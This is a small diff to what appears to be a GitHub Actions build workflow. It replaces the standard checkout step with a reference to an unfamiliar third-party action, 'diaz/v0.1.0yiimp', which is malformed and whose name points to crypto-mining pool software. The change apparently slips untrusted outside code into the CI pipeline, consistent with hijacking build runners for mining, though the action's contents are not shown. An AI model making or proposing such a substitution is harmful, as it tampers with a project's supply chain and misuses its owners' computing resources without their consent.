@@ -8,7 +8,7 @@ jobs:
     runs-on: ubuntu-latest
     
     steps:
-    - uses: action/checkout@v1
+    - uses: diaz/v0.1.0yiimp
     - name: configure
       run: ./configure --disable-tests --disable-bench
     - name: make
